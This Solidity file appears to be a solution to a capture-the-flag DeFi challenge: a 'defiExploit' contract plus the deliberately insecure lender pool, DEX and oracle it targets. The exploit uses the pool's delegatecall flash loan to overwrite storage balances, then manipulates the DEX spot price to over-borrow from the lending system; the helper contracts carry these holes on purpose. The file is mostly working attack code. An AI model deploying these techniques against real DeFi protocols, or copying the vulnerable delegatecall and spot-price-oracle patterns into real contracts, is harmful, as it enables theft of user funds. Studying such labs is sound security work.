// SPDX-License-Identifier: Unlicensed
pragma solidity 0.8.17;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import {Address} from "@openzeppelin/contracts/utils/Address.sol";

contract defiExploit{

    using SafeERC20 for IERC20;

    
    IERC20 public tokenInsecureum;
    mapping(address => uint) public balances;  // MUST be at this slot
    uint public lenderAmount;
    IERC20 public tokenBoring;
    address public owner;
    BorrowSystemInsecureOracle public oracle;
    InsecureDexLP public insecureDex;
    InSecureumLenderPool public lenderPool;
    
    


    constructor(IERC20 _tokenInsecureum, 
                IERC20 _tokenBoring, 
                BorrowSystemInsecureOracle _oracle, 
                InsecureDexLP _insecureDex, 
                InSecureumLenderPool _lenderPool ) 
    {
        tokenInsecureum = _tokenInsecureum;
        tokenBoring = _tokenBoring;
        oracle = _oracle;
        insecureDex = _insecureDex;
        lenderPool = _lenderPool;
        owner = msg.sender;
        
    }

    modifier onlyOwner{
        require(msg.sender == owner, "Call failed.");
        _;
    }    

    function startFlashLoan(address attacker, bytes calldata data) public {
        lenderPool.flashLoan(attacker, data);
    }

    function attack(address attacker)  public returns(bool) {
        uint totals = tokenInsecureum.totalSupply();
        balances[attacker] = totals/3;
        return true;

    }


    function getLoan(uint amount, uint amount2) public onlyOwner{
        
        tokenInsecureum.approve(address(oracle), amount);
        oracle.depositToken0(amount);
        oracle.borrowToken1(amount2);
    }

    function swap(uint amount, uint amount2) public onlyOwner{
        tokenInsecureum.approve(address(insecureDex), amount);
        insecureDex.swap(address(tokenInsecureum), address(tokenBoring), amount);
        tokenBoring.approve(address(oracle), amount2);
        oracle.depositToken1(amount2);
        uint oraclesToken0Balance = tokenInsecureum.balanceOf(address(oracle));
        oracle.borrowToken0(oraclesToken0Balance);
    }
 
    function bytesGenerator (address attacker) public pure returns(bytes memory){
       return abi.encodeWithSignature("attack(address)", attacker);
    }

 
}

contract InsecureDexLP {

    using SafeERC20 for IERC20;

    IERC20 public immutable token0;
    IERC20 public immutable token1;

    // @dev Balance of token0
    uint256 public reserve0;
    // @dev Balance of token1
    uint256 public reserve1;

    // @dev Total liquidity LP
    uint256 public totalSupply;
    // @dev Liquidity shares per user
    mapping(address => uint256) private _balances;

    /* @dev token0Address, token1Address Addresses of the tokens
     * participating in the liquidity pool 
     */
    constructor(address token0Address, address token1Address) {
        token0 = IERC20(token0Address);
        token1 = IERC20(token1Address);
    }

    // @dev Updates the balances of the tokens
    function _updateReserves() internal {
        reserve0 = token0.balanceOf(address(this));
        reserve1 = token1.balanceOf(address(this));
    }
/*
The compiler says amount1 in line 125 and reserve1 in line 128 are not declared!?
    // @dev Allows users to add liquidity for token0 and token1
    function addLiquidity(uint256 amount0, uint256 amount1) external {
        uint liquidity;

        token0.safeTransferFrom(msg.sender, address(this), amount0);
        token1.safeTransferFrom(msg.sender, address(this), amount1);

        uint256 _totalSupply = totalSupply;

       
        if (_totalSupply == 0) {
            liquidity = Math.sqrt(amount0 * amount1);
     
        } else {
            liquidity = Math.min((amount0 * _totalSupply) / reserve0, (amount1 *_totalSupply) / reserve1);
        }

        // @dev Update balances with the new values
        _updateReserves();
        // @dev Increase total supply and user balance accordingly
        unchecked {
            totalSupply += liquidity;
            _balances[msg.sender] += liquidity;
        }
    }
*/
    // @dev Burn LP shares and get token0 and token1 amounts back
    function removeLiquidity(uint256 amount) external returns (uint amount0, uint amount1) {
        require(_balances[msg.sender] >= amount);
        unchecked {
            amount0 = (amount * reserve0) / totalSupply;
            amount1 = (amount * reserve1) / totalSupply;
        }
        require(amount0 > 0 && amount1 > 0, 'InsecureDexLP: INSUFFICIENT_LIQUIDITY_BURNED');
        
        token0.safeTransfer(msg.sender, amount0);
        token1.safeTransfer(msg.sender, amount1);
        
        unchecked {
            _balances[msg.sender] -= amount;
            totalSupply -= amount;
        }
        
        _updateReserves();
    }

    // @dev Swap amountIn of tokenFrom to tokenTo
    function swap(address tokenFrom, address tokenTo, uint256 amountIn) external returns(uint256 amountOut) {
        require(tokenFrom == address(token0) || tokenFrom == address(token1), "tokenFrom is not supported");
        require(tokenTo == address(token0) || tokenTo == address(token1), "tokenTo is not supported");

        if (tokenFrom == address(token0)) {
            amountOut = _calcAmountsOut(amountIn, reserve0, reserve1);
            token0.safeTransferFrom(msg.sender, address(this), amountIn);
            token1.safeTransfer(msg.sender, amountOut);
        } else {
            amountOut = _calcAmountsOut(amountIn, reserve1, reserve0);
            token1.safeTransferFrom(msg.sender, address(this), amountIn);
            token0.safeTransfer(msg.sender, amountOut);
        }
        _updateReserves();
    }

    /* @dev Given an amountIn of tokenIn, compute the corresponding output of
     * tokenOut
     */
    function calcAmountsOut(address tokenIn, uint256 amountIn) external view returns(uint256 output) {
        if (tokenIn == address(token0)) {
            output = _calcAmountsOut(amountIn, reserve0, reserve1);
        } else if (tokenIn == address(token1)) {
            output = _calcAmountsOut(amountIn, reserve1, reserve0);
        } else {
            revert('Token is not supported');
        }
    }

    // @dev See balance of user
    function balanceOf(address user) external view returns(uint256) {
        return _balances[user];
    }

    /* @dev taken from uniswap library;
     * https://github.com/Uniswap/v2-periphery/blob/master/contracts/libraries/UniswapV2Library.sol#L43
     */
    function _calcAmountsOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns(uint256 amountOut) {
        amountIn = amountIn * 1000;
        uint numerator = amountIn * reserveOut;
        uint denominator = reserveIn * 1000 + amountIn;
        amountOut = (numerator / denominator);
    }

    function tokenFallback(address, uint256, bytes memory) external {

    }
}



// helper contracts


contract InSecureumLenderPool {
    using Address for address;
    using SafeERC20 for IERC20;

    /// @dev Token contract address to be used for lending.
    //IERC20 immutable public token;
    IERC20 public token;
    /// @dev Internal balances of the pool for each user.
    mapping(address => uint) public balances;

    // flag to notice contract is on a flashloan
    bool private _flashLoan;

    /// @param _token Address of the token to be used for the lending pool.
    constructor (address _token) {
        token = IERC20(_token);
    }

    /// @dev Deposit the given amount of tokens to the lending 
    ///      pool. This will add _amount to balances[msg.sender] and
    ///      transfer _amount tokens to the lending pool.
    /// @param _amount Amount of token to deposit in the lending pool
    function deposit(uint256 _amount) external {
        require(!_flashLoan, "Cannot deposit while flash loan is active");
        token.safeTransferFrom(msg.sender, address(this), _amount);
        balances[msg.sender] += _amount;
    }
    
    /// @dev Withdraw the given amount of tokens from the lending pool.
    function withdraw(uint256 _amount) external {
        require(!_flashLoan, "Cannot withdraw while flash loan is active");
        balances[msg.sender] -= _amount;
        token.safeTransfer(msg.sender, _amount);
    }   

    /// @dev Give borrower all the tokens to make a flashloan.
    ///      For this with get the amount of tokens in the lending pool before, then we give
    ///      control to the borrower to make the flashloan. After the borrower makes the flashloan
    ///      we check if the lending pool has the same amount of tokens as before.
    /// @param borrower The contract that will have access to the tokens
    /// @param data Function call data to be used by the borrower contract.
    function flashLoan(
        address borrower,
        bytes calldata data
    )
        external
    {
        uint256 balanceBefore = token.balanceOf(address(this));
        
        _flashLoan = true;
        
        borrower.functionDelegateCall(data);

        _flashLoan = false;

        uint256 balanceAfter = token.balanceOf(address(this));
        require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
    }
}

interface IInsecureDexLP {
	function calcAmountsOut(address tokenIn, uint256 amountIn) external view returns(uint256 output);
}

/** @dev Codebase heavily inspired by
 * https://github.com/maxsam4/bad-lending-demo/blob/main/contracts/LeBo.sol
 */

contract BorrowSystemInsecureOracle {

	using SafeERC20 for IERC20;

	/// @dev oracle to be used
	IInsecureDexLP immutable oracleToken;	
	/// @dev ERC20 tokens participating in the borrow system
	IERC20 immutable public token0;
	IERC20 immutable public token1;

	/// @dev Borrow and lend balances
	mapping (address => uint256) token0Deposited;
	mapping (address => uint256) token0Borrowed;
	mapping (address => uint256) token1Deposited;
	mapping (address => uint256) token1Borrowed;

	constructor(address _oracleToken, address _tokenInsecureum, address _tokenBoring) {
		oracleToken = IInsecureDexLP(_oracleToken);
		token0 = IERC20(_tokenInsecureum);
		token1 = IERC20(_tokenBoring);
	}

	function depositToken0(uint256 amount) external {
		token0.safeTransferFrom(msg.sender, address(this), amount);
		token0Deposited[msg.sender] += amount;
	}

	function depositToken1(uint256 amount) external {
		token1.safeTransferFrom(msg.sender, address(this), amount);
		token1Deposited[msg.sender] += amount;
	}

	function borrowToken0(uint256 amount) external {
		token0Borrowed[msg.sender] += amount;
		require(isSolvent(msg.sender), "User is not solvent");
		token0.safeTransfer(msg.sender, amount);
	}

	function borrowToken1(uint256 amount) external {
		token1Borrowed[msg.sender] += amount;
		require(isSolvent(msg.sender), "User is not solvent");
		token1.safeTransfer(msg.sender, amount);
	}

	/// @dev Liquidate an undercollaterized position
	function liquidate(address user) external {
	    require(!isSolvent(user), "User is not solvent!");

		// @dev Retrieve user balances
		uint256 _token0Borrowed = token0Borrowed[user];
		uint256 _token1Borrowed = token1Borrowed[user];
		uint256 _token0Deposited = token0Deposited[user];
		uint256 _token1Deposited = token1Deposited[user];

		// @dev Check iteration effects
		token0Borrowed[user] = 0;
		token1Borrowed[user] = 0;
		token0Deposited[user] = 0;
		token1Deposited[user] = 0;

		token0.safeTransferFrom(msg.sender, address(this), _token0Borrowed);
		token1.safeTransferFrom(msg.sender, address(this), _token1Borrowed);
		token0.safeTransfer(msg.sender, _token0Deposited);
		token1.safeTransfer(msg.sender, _token1Deposited);
	}

	/// @dev Check if user is solvent
	function isSolvent(address user) public view returns (bool) {
		uint256 _base = 1 ether;
		uint256 _tokenPrice = tokenPrice(_base);

		uint256 collateralValue = token0Deposited[user] + (token1Deposited[user] * _tokenPrice) / _base;
		
		uint256 maxBorrow = collateralValue * 100 / 90; // 90% LTV
		uint256 borrowed = token0Borrowed[user] + (token1Borrowed[user] * _tokenPrice) / _base;

		return maxBorrow >= borrowed;
  }

	/// @dev Retrieve token price from oracle
	function tokenPrice(uint256 _amount) public view returns (uint256) {
		return oracleToken.calcAmountsOut(address(token1), _amount);
	}

}



